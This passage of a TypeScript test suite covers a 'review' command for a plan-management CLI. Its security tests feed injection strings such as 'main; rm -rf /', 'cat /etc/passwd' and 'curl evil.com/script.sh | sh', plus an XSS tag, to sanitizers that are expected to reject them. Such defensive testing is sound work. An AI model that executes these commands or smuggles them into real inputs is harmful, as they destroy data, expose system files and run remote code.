        expect(planInfo.planFilePath).toBe(planFile);
        expect(planInfo.captureOutput).toBe('result');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 123,
          title: 'Test Review Execution',
          goal: 'Test that review command uses review execution mode',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task for review execution mode',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue(null);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, {}, mockCommand);

    // Verify the executor was called with correct executionMode
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);

    // The assertions for executionMode are in the mock function above
    // which will throw if the values don't match expected
  });

  test('respects dry-run option', async () => {
    const mockExecutor = {
      execute: vi.fn(async () => 'Should not be called'),
    };

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: join(testDir, 'dry-run.yml'),
        planData: {
          id: 1,
          title: 'Dry Run Test',
          goal: 'Test dry run functionality',
          tasks: [
            {
              title: 'Test task',
              description: 'Dry run test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
      prompt: 'Generated prompt for dry run',
    } as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand('1', { dryRun: true }, mockCommand);

    // Executor should not be called in dry-run mode
    expect(mockExecutor.execute).not.toHaveBeenCalled();
  });

  test('print mode forces json output without prompting', async () => {
    const planFile = join(testDir, 'print-mode.yml');
    await writePlanToDb(
      {
        id: 1,
        title: 'Print Mode Plan',
        goal: 'Test print mode',
        tasks: [
          {
            title: 'Task One',
            description: 'First task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const mockExecutor = {
      execute: vi.fn(async () =>
        JSON.stringify({
          issues: [
            {
              severity: 'minor',
              category: 'style',
              content: 'Use consistent formatting.',
              file: 'src/test.ts',
              line: '10',
              suggestion: 'Run the formatter.',
            },
          ],
          recommendations: [],
          actionItems: [],
        })
      ),
    };

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 1,
          title: 'Print Mode Plan',
          goal: 'Test print mode',
          tasks: [
            {
              title: 'Task One',
              description: 'First task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
      review: {
        autoSave: false,
      },
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue(null);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    const stdoutWrites: string[] = [];
    const originalConsoleLog = console.log;
    console.log = (...args: unknown[]) => {
      stdoutWrites.push(args.map((arg) => String(arg)).join(' '));
    };

    vi.mocked(loggingModule.log).mockImplementation((value: string) => {
      stdoutWrites.push(String(value));
    });

    try {
      await handleReviewCommand(
        planFile,
        {
          print: true,
          format: 'terminal',
          verbosity: 'normal',
          noSave: true,
        },
        mockCommand
      );
    } finally {
      console.log = originalConsoleLog;
    }

    const output = stdoutWrites.join('').trim();
    const jsonStart = output.indexOf('{');
    const jsonEnd = output.lastIndexOf('}');
    if (jsonStart === -1 || jsonEnd === -1 || jsonEnd <= jsonStart) {
      throw new Error(`Expected JSON output, got: ${output}`);
    }
    const parsed = JSON.parse(output.slice(jsonStart, jsonEnd + 1));
    expect(parsed.planId).toBe('1');
    expect(parsed.issues).toHaveLength(1);
  });
});

describe('Parent plan context handling', () => {
  test('includes parent context when plan has a parent', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement a new tim review command that analyzes code changes against plan requirements',
      details:
        'The review command will compare the current branch to the trunk branch, gather all relevant plan context',
      tasks: [],
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Plan Integration',
      goal: 'Enhance the review command to intelligently handle plan hierarchies',
      details:
        'Extend the review command to automatically include relevant context from parent plans',
      parent: 99,
      tasks: [
        {
          title: 'Implement parent plan context gathering',
          description:
            'Add logic to detect when a plan has a parent and automatically include parent context',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/tim/commands/review.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff content',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, [parentPlan], []);

    // Verify parent context is included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Parent Goal:** Implement a new tim review command');
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plan above.'
    );

    // Verify child plan context still included
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** PR review command - Parent-Child Plan Integration');
  });

  test('works normally when plan has no parent', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Standalone Plan',
      goal: 'A plan without a parent',
      tasks: [
        {
          title: 'Task 1',
          description: 'A simple task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    // Should not include parent context
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include normal plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 42');
    expect(prompt).toContain('**Title:** Standalone Plan');
  });

  test('continues without parent context when parent plan is missing', async () => {
    // This test ensures the review works even if parent plan cannot be found
    const childPlan: PlanSchema = {
      id: 101,
      title: 'Child Plan',
      goal: 'A child plan with missing parent',
      parent: 99, // Parent ID exists but plan will not be found
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'mock diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    // Test with undefined parent (simulating missing parent)
    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, [], []);

    // Should not include parent context when parent is missing
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('Parent Plan ID');

    // Should still include child plan context
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');
    expect(prompt).toContain('**Title:** Child Plan');
  });

  test('handles parent plan context integration in handleReviewCommand', async () => {
    const childPlanFile = join(testDir, 'child-101.yml');
    await writePlanToDb(
      {
        id: 101,
        title: 'Child Plan',
        goal: 'Child goal that implements parent',
        parent: 99,
        tasks: [
          {
            title: 'Child task',
            description: 'A child task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    const parentPlan = {
      id: 99,
      title: 'Parent Plan',
      goal: 'Parent goal for context',
      details: 'This is the parent plan providing context',
      tasks: [
        {
          title: 'Parent task',
          description: 'A parent task',
        },
      ],
      filename: join(testDir, '.tim', 'plans', '99.plan.md'),
    };
    const gatherPlanContextMock = vi.fn(async () =>
      createMockPlanContext({
        resolvedPlanFile: childPlanFile,
        planData: {
          id: 101,
          title: 'Child Plan',
          goal: 'Child goal that implements parent',
          parent: 99,
          tasks: [
            {
              title: 'Child task',
              description: 'A child task',
            },
          ],
        },
        parentChain: [parentPlan],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        },
      })
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string) => {
        // Verify the prompt includes parent context
        expect(prompt).toContain('# Parent Plan Context');
        expect(prompt).toContain('**Parent Plan ID:** 99');
        expect(prompt).toContain('**Parent Title:** Parent Plan');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({
          config: testDir,
        }),
      },
    };

    await handleReviewCommand(childPlanFile, {}, mockCommand);

    expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });
});

describe('Hierarchy integration with utilities', () => {
  test('handles multiple levels of parent plans', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Root Project Plan',
      goal: 'Implement the entire project',
      details: 'This is the top-level project plan',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement review functionality',
      details: 'Mid-level plan for review features',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childPlan: PlanSchema = {
      id: 101,
      title: 'PR review command - Parent-Child Integration',
      goal: 'Enhance review command with hierarchy support',
      parent: 99,
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    // Test with multi-level parent chain
    const parentChain = [parentPlan, grandparentPlan];
    const prompt = buildReviewPrompt(childPlan, diffResult, true, false, parentChain, []);

    // Verify both parent levels are included
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** PR review command');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');
    expect(prompt).toContain('**Grandparent (Level 2) Title:** Root Project Plan');
    expect(prompt).toContain('---'); // Section separator
    expect(prompt).toContain(
      'This review is for a child plan implementing part of the parent plans above'
    );
  });

  test('includes completed children when reviewing parent plan', async () => {
    const parentPlan: PlanSchema = {
      id: 99,
      title: 'PR review command',
      goal: 'Implement complete review functionality',
      tasks: [
        {
          title: 'Parent task',
          description: 'High-level task',
        },
      ],
    };

    const completedChild1: PlanWithFilename = {
      id: 100,
      title: 'Core Review Implementation',
      goal: 'Implement basic review command',
      details: 'This child handles the core review logic',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-100.yml',
    };

    const completedChild2: PlanWithFilename = {
      id: 101,
      title: 'Parent-Child Integration',
      goal: 'Add hierarchy support to review',
      details: 'This child adds parent-child relationship handling',
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/review.ts', 'src/hierarchy.ts'],
      baseBranch: 'main',
      diffContent: 'parent review diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const completedChildren = [completedChild1, completedChild2];
    const prompt = buildReviewPrompt(parentPlan, diffResult, true, false, [], completedChildren);

    // Verify completed children section is included
    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain(
      'The following child plans have been completed as part of this parent plan:'
    );
    expect(prompt).toContain('**Child Plan ID:** 100');
    expect(prompt).toContain('**Child Title:** Core Review Implementation');
    expect(prompt).toContain('**Child Goal:** Implement basic review command');
    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Parent-Child Integration');
    expect(prompt).toContain(
      'consider how these completed children contribute to the overall goals'
    );
  });

  test('handles both parent chain and completed children together', async () => {
    const grandparentPlan: PlanWithFilename = {
      id: 50,
      title: 'Project Root',
      goal: 'Top level goal',
      tasks: [],
      filename: 'grandparent-50.yml',
    };

    const parentPlan: PlanWithFilename = {
      id: 99,
      title: 'Middle Plan',
      goal: 'Middle level goal',
      parent: 50,
      tasks: [],
      filename: 'parent-99.yml',
    };

    const currentPlan: PlanSchema = {
      id: 101,
      title: 'Current Plan',
      goal: 'Current plan goal',
      parent: 99,
      tasks: [
        {
          title: 'Current task',
          description: 'Task description',
        },
      ],
    };

    const completedChild: PlanWithFilename = {
      id: 102,
      title: 'Completed Child',
      goal: 'Child goal',
      status: 'done',
      parent: 101,
      tasks: [],
      filename: 'child-102.yml',
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'complex diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const parentChain = [parentPlan, grandparentPlan];
    const completedChildren = [completedChild];
    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      true,
      false,
      parentChain,
      completedChildren
    );

    // Verify both parent and children contexts are included in correct order
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Grandparent (Level 2) Plan ID:** 50');

    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain('**Child Plan ID:** 102');

    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 101');

    // Verify order: parent context, then children context, then current plan context
    const parentIndex = prompt.indexOf('# Parent Plan Context');
    const childrenIndex = prompt.indexOf('# Completed Child Plans');
    const planIndex = prompt.indexOf('# Plan Context');

    expect(parentIndex).toBeLessThan(childrenIndex);
    expect(childrenIndex).toBeLessThan(planIndex);
  });

  test('handles plan without ID gracefully', async () => {
    const planWithoutId: PlanSchema = {
      // No ID field
      title: 'Plan Without ID',
      goal: 'Test plan without ID',
      tasks: [
        {
          title: 'Test task',
          description: 'Task description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    // Should not attempt hierarchy traversal without an ID
    const prompt = buildReviewPrompt(planWithoutId, diffResult, true, false, [], []);

    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Title:** Plan Without ID');
  });

  test('handles empty parent chain and children arrays', async () => {
    const simplePlan: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'Simple goal',
      tasks: [
        {
          title: 'Simple task',
          description: 'Simple description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['simple.ts'],
      baseBranch: 'main',
      diffContent: 'simple diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(simplePlan, diffResult, true, false, [], []);

    // Should work like before - no parent or children sections
    expect(prompt).not.toContain('# Parent Plan Context');
    expect(prompt).not.toContain('# Completed Child Plans');
    expect(prompt).toContain('# Plan Context');
    expect(prompt).toContain('**Plan ID:** 1');
    expect(prompt).toContain('**Title:** Simple Plan');
  });

  test('handles plan hierarchy with missing plan details gracefully', async () => {
    const parentWithoutDetails: PlanWithFilename = {
      id: 99,
      title: 'Parent Plan',
      goal: 'Parent goal',
      // No details field
      tasks: [],
      filename: 'parent-99.yml',
    };

    const childWithoutDetails: PlanWithFilename = {
      id: 101,
      title: 'Child Plan',
      goal: 'Child goal',
      // No details field
      status: 'done',
      parent: 99,
      tasks: [],
      filename: 'child-101.yml',
    };

    const currentPlan: PlanSchema = {
      id: 100,
      title: 'Current Plan',
      goal: 'Current goal',
      parent: 99,
      tasks: [
        {
          title: 'Task',
          description: 'Description',
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'main',
      diffContent: 'test diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      true,
      false,
      [parentWithoutDetails],
      [childWithoutDetails]
    );

    // Should include basic info but not try to include missing details
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** Parent Plan');
    expect(prompt).toContain('**Parent Goal:** Parent goal');
    expect(prompt).not.toContain('**Parent Details:**');

    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Child Plan');
    expect(prompt).toContain('**Child Goal:** Child goal');
    expect(prompt).not.toContain('**Child Details:**');
  });
});

// Security tests for the implemented security fixes
describe('Security fixes', () => {
  describe('Branch name sanitization', () => {
    test('rejects branch name with command injection attempts', async () => {
      // Test branch names that could potentially be used for command injection
      const maliciousBranches = [
        'main; rm -rf /',
        'main && echo "hacked"',
        'main | cat /etc/passwd',
        'main`echo hacked`',
        'main$(echo hacked)',
        'main & echo hacked &',
        'main\nrm -rf /',
        'main; cat /etc/passwd > output.txt',
        'main || curl evil.com/script.sh | sh',
        '../../../main',
        '..\\..\\main',
      ];

      for (const maliciousBranch of maliciousBranches) {
        // Test the sanitization function directly
        expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');
      }
    });

    test('accepts valid branch names', async () => {
      const validBranches = [
        'main',
        'master',
        'feature/new-feature',
        'bugfix/issue-123',
        'release-1.0.0',
        'dev',
        'staging',
        'feature_branch',
        'hotfix.urgent',
        'user/john/feature',
        'v1.2.3',
      ];

      for (const validBranch of validBranches) {
        // Test the sanitization function directly instead of the full generateDiffForReview
        // since mocking Bun's $ utility is complex

        // Should not throw an error for valid branch names
        expect(() => sanitizeBranchName(validBranch)).not.toThrow();
        expect(sanitizeBranchName(validBranch)).toBe(validBranch);
      }
    });

    test('sanitizes branch name in both git and jj modes', async () => {
      const maliciousBranch = 'main; rm -rf /';

      // Test the sanitization function directly - it should reject malicious input
      expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');

      // The sanitizeBranchName function is used in both git and jj code paths in generateDiffForReview
      // So testing it directly verifies protection in both modes
    });
  });

  describe('Input validation for plan files', () => {
    test('validates multiple tasks correctly', async () => {
      const planFile = join(testDir, 'multiple-invalid-tasks.yml');

      vi.mocked(contextGatheringModule.gatherPlanContext).mockRejectedValue(
        new Error('tasks.1.title: Invalid input: expected string, received undefined')
      );

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        'tasks.1.title: Invalid input: expected string, received undefined'
      );
    });
  });

  describe('Large diff protection', () => {
    test('has correct size limit constant', async () => {
      // Test that the MAX_DIFF_SIZE constant is properly set to 10MB
      const reviewModule = await import('./review.js');
      // We can't directly access the constant, but we can test the logic indirectly

      // Create a string that exceeds 10MB (10 * 1024 * 1024 bytes)
      const largeDiff = 'a'.repeat(11 * 1024 * 1024); // 11MB
      const largeDiffSizeInBytes = Buffer.byteLength(largeDiff, 'utf8');

      expect(largeDiffSizeInBytes).toBeGreaterThan(10 * 1024 * 1024);

      // The protection logic uses Buffer.byteLength to check size, which is the right approach
      // for UTF-8 string length checking
    });

    test('diff size calculation works correctly', () => {
      // Test that byte length calculation works correctly for different string types
      const smallString = 'hello';
      const mediumString = 'a'.repeat(1024); // 1KB
      const unicodeString = '🔒'.repeat(100); // Unicode characters take more bytes

      expect(Buffer.byteLength(smallString, 'utf8')).toBe(5);
      expect(Buffer.byteLength(mediumString, 'utf8')).toBe(1024);
      expect(Buffer.byteLength(unicodeString, 'utf8')).toBeGreaterThan(100); // Unicode takes more bytes
    });
  });

  describe('Error handling improvements', () => {
    test('error message format includes exit codes and stderr', () => {
      // Test that our error message format includes the expected information
      const exitCode = 128;
      const stderr = 'fatal: not a git repository';
      const expectedMessage = `git diff --name-only command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('git diff --name-only command failed');
      expect(expectedMessage).toContain('exit code 128');
      expect(expectedMessage).toContain('fatal: not a git repository');
    });

    test('jj error message format includes exit codes and stderr', () => {
      // Test that our jj error message format includes the expected information
      const exitCode = 1;
      const stderr = 'Error: No jj repo in current directory';
      const expectedMessage = `jj diff --summary command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('jj diff --summary command failed');
      expect(expectedMessage).toContain('exit code 1');
      expect(expectedMessage).toContain('Error: No jj repo in current directory');
    });

    test('error context wrapping format', () => {
      // Test that error wrapping preserves the original error message
      const originalError = 'Unexpected error';
      const wrappedMessage = `Failed to generate git diff: ${originalError}`;

      expect(wrappedMessage).toContain('Failed to generate git diff');
      expect(wrappedMessage).toContain('Unexpected error');
    });

    test('handles executor errors properly in review command', async () => {
      const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - title: Test task
    description: A test task
`;
      const planFile = join(testDir, 'error-test.yml');
      await writeFile(planFile, `---\n${planContent}---\n`);

      const mockExecutor = {
        execute: async () => {
          throw new Error('Network timeout');
        },
      };

      vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

      vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
        createMockPlanContext({
          resolvedPlanFile: planFile,
          planData: {
            id: 1,
            title: 'Test Plan',
            goal: 'Test goal',
            tasks: [
              {
                title: 'Test task',
                description: 'A test task',
              },
            ],
          },
          parentChain: [],
          completedChildren: [],
          diffResult: {
            hasChanges: true,
            changedFiles: ['test.ts'],
            baseBranch: 'main',
            diffContent: 'test diff',
          },
          incrementalSummary: null,
          noChangesDetected: false,
        }) as any
      );

      vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

      vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        'Review execution failed: Network timeout'
      );
    });
  });

  describe('Focus areas validation', () => {
    test('prevents injection attacks in focus areas', () => {
      const maliciousFocusAreas = [
        ['security; rm -rf /'],
        ['performance && echo hacked'],
        ['testing | cat /etc/passwd'],
        ['review`echo hacked`'],
        ['focus$(echo hacked)'],
        ['area\nrm -rf /'],
        ['<script>alert("xss")</script>'],
        ['${process.env.HOME}'],
        ['../../../etc/passwd'],
        ['focus\x00hidden'],
      ];

      for (const maliciousAreas of maliciousFocusAreas) {
        expect(() => validateFocusAreas(maliciousAreas)).toThrow(
          /Focus area contains invalid characters/
        );
      }
    });

    test('allows safe focus areas', () => {
      const safeFocusAreas = [
        ['security', 'performance'],
        ['code-quality', 'testing'],
        ['review_guidelines'],
        ['API.design'],
        ['user-experience'],
        ['data_validation'],
        ['error handling'],
        ['documentation'],
      ];

      for (const safeAreas of safeFocusAreas) {
        expect(() => validateFocusAreas(safeAreas)).not.toThrow();
        const result = validateFocusAreas(safeAreas);
        expect(result).toEqual(safeAreas);
      }
    });

    test('enforces focus area limits', () => {
      const tooManyAreas = Array(15).fill('area');
      expect(() => validateFocusAreas(tooManyAreas)).toThrow('Too many focus areas specified');

      const tooLongArea = ['a'.repeat(100)];
      expect(() => validateFocusAreas(tooLongArea)).toThrow('Focus area too long');
    });

    test('filters empty and whitespace-only areas', () => {
      const areasWithEmpty = ['security', '', '   ', 'performance', '\t'];
      const result = validateFocusAreas(areasWithEmpty);
      expect(result).toEqual(['security', 'performance']);
    });

    test('validates input type for focus areas', () => {
      expect(() => validateFocusAreas(null as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas('not-array' as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas(42 as any)).toThrow('Focus areas must be an array');
    });
  });

  describe('Review task scoping', () => {
    test('returns original plan when no filters are provided', () => {
      const planData: PlanSchema = {
        id: 1,
        title: 'Scoped Plan',
        goal: 'Test scoping',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, {});

      expect(result.planData).toBe(planData);
      expect(result.taskScopeNote).toBeUndefined();
      expect(result.isScoped).toBe(false);
      expect(result.remainingTasks).toEqual([]);
    });

    test('filters tasks by index and preserves order', () => {
      const planData: PlanSchema = {
        id: 2,
        title: 'Index Filter Plan',
        goal: 'Test index filters',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
          { title: 'Task Three', description: 'Third task', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskIndex: ['1', '3'] }); // 1-based indices

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Task One', 'Task Three']);
      expect(result.taskScopeNote).toContain('(2 of 3)');
      expect(result.isScoped).toBe(true);
      // Task Two (index 2) is unfinished and outside the scope
      expect(result.remainingTasks).toEqual([{ index: 2, title: 'Task Two' }]);
    });

    test('preserves original task indexes when filtering', () => {
      const planData: PlanSchema = {
        id: 2,
        title: 'Original Index Plan',
        goal: 'Test original index preservation',
        tasks: [
          { title: 'Task One', description: 'First task', done: false },
          { title: 'Task Two', description: 'Second task', done: false },
          { title: 'Task Three', description: 'Third task', done: false },
          { title: 'Task Four', description: 'Fourth task', done: false },
          { title: 'Task Five', description: 'Fifth task', done: false },
        ],
      };

      // Select tasks 2 and 4 (1-based)
      const result = resolveReviewTaskScope(planData, { taskIndex: ['2', '4'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Task Two', 'Task Four']);
      // Verify original 1-based indexes are preserved
      expect(result.planData.tasks?.map((task: any) => task.originalIndex)).toEqual([2, 4]);
      expect(result.isScoped).toBe(true);
    });

    test('filters tasks by title case-insensitively and includes duplicates', () => {
      const planData: PlanSchema = {
        id: 3,
        title: 'Title Filter Plan',
        goal: 'Test title filters',
        tasks: [
          { title: 'Build', description: 'First', done: false },
          { title: 'Test', description: 'Second', done: false },
          { title: 'build', description: 'Third', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, { taskTitle: ['BUILD'] });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Build', 'build']);
      expect(result.isScoped).toBe(true);
    });

    test('supports comma-separated task filters and unions matches', () => {
      const planData: PlanSchema = {
        id: 5,
        title: 'Comma Filter Plan',
        goal: 'Test comma filters',
        tasks: [
          { title: 'Alpha', description: 'First', done: false },
          { title: 'Beta', description: 'Second', done: false },
          { title: 'Gamma', description: 'Third', done: false },
        ],
      };

      const result = resolveReviewTaskScope(planData, {
        taskIndex: ['1,3'], // 1-based indices
        taskTitle: ['Beta'],
      });

      expect(result.planData.tasks?.map((task) => task.title)).toEqual(['Alpha', 'Beta', 'Gamma']);
      expect(result.isScoped).toBe(true);
    });

    test('rejects non-integer task index filters', () => {
      const planData: PlanSchema = {
        id: 6,
        title: 'Invalid Index Plan',
        goal: 'Test invalid indexes',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() => resolveReviewTaskScope(planData, { taskIndex: ['1.5'] })).toThrow(
        'Invalid task indexes: 1.5'
      );
    });

    test('reports unknown task indexes and titles', () => {
      const planData: PlanSchema = {
        id: 4,
        title: 'Error Plan',
        goal: 'Test unknown filters',
        tasks: [{ title: 'Task One', description: 'Only task', done: false }],
      };

      expect(() =>
        resolveReviewTaskScope(planData, { taskIndex: ['5'], taskTitle: ['Missing Task'] })
      ).toThrow('Unknown task indexes: 5; Unknown task titles: Missing Task');
    });

    test('reports negative indexes as invalid alongside missing titles', () => {
